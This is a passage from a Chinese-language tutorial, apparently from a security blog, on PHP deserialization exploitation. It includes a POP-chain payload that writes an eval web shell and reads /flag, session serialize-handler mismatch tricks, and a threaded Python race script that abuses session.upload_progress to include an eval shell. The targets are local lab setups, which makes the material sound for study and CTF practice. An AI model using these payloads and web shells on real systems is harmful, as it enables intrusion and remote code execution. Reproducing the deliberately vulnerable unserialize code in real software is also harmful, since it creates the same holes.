. <span class="hljs-keyword">$this</span>-&gt;url . <span class="hljs-string">&quot;&#x27;&gt;&lt;i&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot;&lt;/i&gt;&lt;/a&gt; by &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;logger-&gt;log(<span class="hljs-string">&quot;Song &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot; by [i]&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group . <span class="hljs-string">&quot;[/i] viewed.\n&quot;</span>);  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_name</span>(<span class="hljs-params"></span>) </span>&#123;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;name;  &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lyrics</span> </span>&#123;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$lyrics</span>;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$song</span>;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span>, <span class="hljs-variable">$song</span></span>) </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;song = <span class="hljs-variable">$song</span>;    <span class="hljs-keyword">$this</span>-&gt;lyrics = <span class="hljs-variable">$lyrics</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;__toString() . <span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;&quot;</span> . str_replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;lyrics) . <span class="hljs-string">&quot;&lt;/p&gt;\n&quot;</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;song-&gt;log();  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shortForm</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=&#x27;song.php?name=&quot;</span> . urlencode(<span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name()) . <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() . <span class="hljs-string">&quot;&lt;/a&gt;&lt;/p&gt;&quot;</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name_is</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() === <span class="hljs-variable">$name</span>;  &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;  <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLyrics</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span></span>) </span>&#123;    <span class="hljs-variable">$oldlyrics</span> = <span class="hljs-keyword">array</span>();    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lyrics&#x27;</span>])) &#123;      <span class="hljs-variable">$oldlyrics</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lyrics&#x27;</span>]));    &#125;    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$lyrics</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$lyric</span>) <span class="hljs-variable">$oldlyrics</span> []= <span class="hljs-variable">$lyric</span>;    setcookie(<span class="hljs-string">&#x27;lyrics&#x27;</span>, base64_encode(serialize(<span class="hljs-variable">$oldlyrics</span>)));  &#125;  <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLyrics</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lyrics&#x27;</span>])) &#123;      <span class="hljs-keyword">return</span> unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lyrics&#x27;</span>]));    &#125;    <span class="hljs-keyword">else</span> &#123;      setcookie(<span class="hljs-string">&#x27;lyrics&#x27;</span>, base64_encode(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))));      <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);    &#125;  &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Porter</span> </span>&#123;  <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exportData</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> base64_encode(serialize(<span class="hljs-variable">$lyrics</span>));  &#125;  <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">importData</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> serialize(base64_decode(<span class="hljs-variable">$lyrics</span>));  &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Conn</span> </span>&#123;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$conn</span>;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$db</span></span>) </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;conn = mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$db</span>);  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLyrics</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span></span>) </span>&#123;    <span class="hljs-variable">$r</span> = <span class="hljs-keyword">array</span>();    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$lyrics</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$lyric</span>) &#123;      <span class="hljs-variable">$s</span> = intval(<span class="hljs-variable">$lyric</span>);      <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SELECT data FROM lyrics WHERE id=<span class="hljs-subst">$s</span>&quot;</span>);      <span class="hljs-keyword">while</span> ((<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_row()) != <span class="hljs-literal">NULL</span>) &#123;        <span class="hljs-variable">$r</span> []= unserialize(base64_decode(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]));      &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-variable">$r</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLyrics</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span></span>) </span>&#123;    <span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>();    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$lyrics</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$lyric</span>) &#123;      <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;INSERT INTO lyrics (data) VALUES (\&quot;&quot;</span> . base64_encode(serialize(<span class="hljs-variable">$lyric</span>)) . <span class="hljs-string">&quot;\&quot;)&quot;</span>);      <span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SELECT MAX(id) FROM lyrics&quot;</span>);      <span class="hljs-variable">$id</span>= <span class="hljs-variable">$res</span>-&gt;fetch_row(); <span class="hljs-variable">$ids</span>[]= intval(<span class="hljs-variable">$id</span>[<span class="hljs-number">0</span>]);    &#125;    <span class="hljs-keyword">echo</span> var_dump(<span class="hljs-variable">$ids</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$ids</span>;   &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;conn-&gt;close();    <span class="hljs-keyword">$this</span>-&gt;conn = <span class="hljs-literal">NULL</span>;  &#125;&#125;;unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);</code></pre></div><ul><li>我们新建一个Lyrics对象</li><li>将它的song属性为Song对象</li><li>Song对象的log属性填充成Logger对象</li><li>再把logger对象的logwriter的属性填充成LogWriter_File对象</li><li>LogWriter_File的$format属性设置成OutputFilter</li><li>OutputFilter里面的filter方法用preg_match写入一句话。</li></ul><p><strong>payload</strong></p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//require_once &#x27;index.php&#x27;;</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutputFilter</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$matchPattern</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$replacement</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$repl</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;matchPattern = <span class="hljs-variable">$pattern</span>;        <span class="hljs-keyword">$this</span>-&gt;replacement = <span class="hljs-variable">$repl</span>;    &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogWriter_File</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$format</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$format</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;filename = str_replace(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;__&quot;</span>, str_replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-variable">$filename</span>));        <span class="hljs-keyword">$this</span>-&gt;format = <span class="hljs-variable">$format</span>;    &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$logwriter</span>;<span class="hljs-comment">//这里装入LogWriter_File对象</span>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$writer</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;logwriter = <span class="hljs-variable">$writer</span>;    &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFileFormat</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filters</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$endl</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filters</span>, <span class="hljs-variable">$endl</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;filters = <span class="hljs-variable">$filters</span>;        <span class="hljs-keyword">$this</span>-&gt;endl = <span class="hljs-variable">$endl</span>;    &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lyrics</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$lyrics</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$song</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span>, <span class="hljs-variable">$song</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;song = <span class="hljs-variable">$song</span>;        <span class="hljs-keyword">$this</span>-&gt;lyrics = <span class="hljs-variable">$lyrics</span>;    &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Song</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$logger</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$group</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$url</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$logger</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;group = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;logger = <span class="hljs-variable">$logger</span>;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CURL</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;    <span class="hljs-variable">$ch</span> = curl_init();    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">FALSE</span>);    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">FALSE</span>);    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);    curl_close(<span class="hljs-variable">$ch</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Lyrics(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-keyword">new</span> Song(<span class="hljs-keyword">new</span> Logger(<span class="hljs-keyword">new</span> LogWriter_File(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-keyword">new</span> LogFileFormat(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> OutputFilter(<span class="hljs-string">&#x27;/Song/&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_GET[&quot;drom&quot;]);?&gt;&#x27;</span>)),<span class="hljs-string">&#x27;\n&#x27;</span>)))));CURL(<span class="hljs-string">&#x27;http://127.0.0.1/lemon/index.php?cmd=&#x27;</span>.urlencode(serialize(<span class="hljs-variable">$a</span>)));<span class="hljs-keyword">echo</span> CURL(<span class="hljs-string">&#x27;http://127.0.0.1/lemon/shell.php?drom=readfile(\&#x27;/flag\&#x27;);&#x27;</span>);</code></pre></div><h2 id="0x05-php-session反序列化"><a href="#0x05-php-session反序列化" class="headerlink" title="0x05 php session反序列化"></a>0x05 php session反序列化</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>首先我们需要了解session反序列化是什么？<br>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化<br>在php.ini中有以下配置项，wamp的默认配置如图</p><p><a href="https://github.com/twosmi1e/twosmi1e.github.io/blob/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png?raw=true"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1545234989274.png" alt="img"></a><br><a href="https://github.com/twosmi1e/twosmi1e.github.io/blob/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545235002297.png?raw=true"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1545235002297.png" alt="img"></a></p><p><code>session.save_path</code> 设置session的存储路径<br><code>session.save_handler</code> 设定用户自定义存储函数<br><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话<br><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php<br>除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同</p><ul><li>php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</li><li>php 键名＋竖线＋经过serialize()函数反序列处理的值</li><li>php_serialize serialize()函数反序列处理数组方式</li></ul><h3 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h3><p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值。<br>来测试一个demo</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);    session_start();    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;twosmi1e&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>运行后在配置文件设定的路径中会生成一个session文件</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1545236350464.png" alt="img"></p><p>存储引擎为php时</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1545236700999.png" alt="img"></p><p>存储引擎为php_binary时结果为</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1545236642027.png" alt="img"></p><p>三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患。</p><p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ryat&#x27;</span>] = <span class="hljs-string">&#x27;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&#x27;</span>;</code></pre></div><p>上述的$_SESSION的数据使用php_serialize，那么最后的存储的内容就是<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</code></p><p>但是我们在进行读取的时候，选择的是php，那么最后读取的内容是:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">array</span> (size=<span class="hljs-number">1</span>) <span class="hljs-string">&#x27;a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;&#x27;</span> =&gt;  <span class="hljs-keyword">object</span>(<span class="hljs-built_in">__PHP_Incomplete_Class</span>)[<span class="hljs-number">1</span>] <span class="hljs-keyword">public</span> <span class="hljs-string">&#x27;__PHP_Incomplete_Class_Name&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;PeopleClass&#x27;</span> (length=<span class="hljs-number">11</span>)</code></pre></div><p>这是因为当使用php引擎的时候，php引擎会以|作为作为key和value的分隔符，那么就会将<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。</p><h3 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h3><h4 id="代码中可控session"><a href="#代码中可控session" class="headerlink" title="代码中可控session"></a>代码中可控session</h4><p>存在s1.php和us2.php，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞、<br>s1.php，使用php_serialize来处理session</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);session_start();<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;spoock&quot;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];</code></pre></div><p><strong>us2.php,使用php来处理session</strong></p><div class="hljs code-wrapper"><pre><code class="hljs php">ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);session_start();<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span> </span>&#123; <span class="hljs-keyword">var</span> <span class="hljs-variable">$hi</span>; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-keyword">$this</span>-&gt;hi = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>; &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;hi); &#125;&#125;</code></pre></div><p><strong>当访问s1.php时，提交如下的数据：</strong></p><p>localhost/s1.php?a=|O:5:”lemon”:1:{s:2:”hi”;s:14:”echo “spoock”;”;}</p><p>此时传入的数据会按照php_serialize来进行序列化。</p><p>此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的<code>eval()</code>方法。</p><h4 id="代码中不可控"><a href="#代码中不可控" class="headerlink" title="代码中不可控"></a>代码中不可控</h4><p>当代码中不可控session时，可以利用session.upload_progress进行文件包含和反序列化</p><p>在php.ini有以下几个默认选项</p><ol><li>session.upload_progress.enabled = on</li><li>session.upload_progress.cleanup = on</li><li>session.upload_progress.prefix = “upload_progress_”</li><li>session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS”</li><li>session.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要。</li></ol><ul><li><p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p></li><li><p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p></li><li><p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p></li><li><p><code>prefix+name</code>将表示为session中的键名</p></li></ul><h5 id="利用session-upload-progress进行文件包含利用"><a href="#利用session-upload-progress进行文件包含利用" class="headerlink" title="利用session.upload_progress进行文件包含利用"></a>利用session.upload_progress进行文件包含利用</h5><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$b</span>&quot;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p><p><strong>问题一</strong></p><p>代码里没有<code>session_start()</code>,如何创建session文件呢。</p><p><strong>解答一</strong></p><p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p><p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p><p><strong>问题二</strong></p><p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p><p><strong>解答二</strong></p><p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p><p><strong>payload</strong></p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><span class="hljs-keyword">import</span> io<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> threadingsessid = <span class="hljs-string">&#x27;TGAO&#x27;</span>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">session</span>):</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)        resp = session.post( <span class="hljs-string">&#x27;http://127.0.0.1/ss/index.php&#x27;</span>, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">session</span>):</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        resp = session.post(<span class="hljs-string">&#x27;http://127.0.0.1/ss/index.php?file=/var/lib/php/sessions/sess_&#x27;</span>+sessid,data=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;tgao.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:            print(resp.text)            event.clear()        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">&quot;[+++++++++++++]retry&quot;</span>)<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:    event=threading.Event()    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):            threading.Thread(target=write,args=(session,)).start()        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):            threading.Thread(target=read,args=(session,)).start()    event.<span class="hljs-built_in">set</span>()</code></pre></div><h5 id="利用session-upload-progress进行反序列化攻击"><a href="#利用session-upload-progress进行反序列化攻击" class="headerlink" title="利用session.upload_progress进行反序列化攻击"></a>利用session.upload_progress进行反序列化攻击</h5><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote><p>php7.2</p><p>ubuntu18.04</p><p><code>session.serialize_handler=php_serialize</code>，其余session相关配置为默认值  //session.upload_progress依赖php.ini</p></blockquote><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);session_start();<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Door</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;handle=<span class="hljs-keyword">new</span> TimeNow();    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;handle-&gt;action();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TimeNow</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的访问时间:&quot;</span>.<span class="hljs-string">&quot;  &quot;</span>.date(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>,time());    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">IP</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span 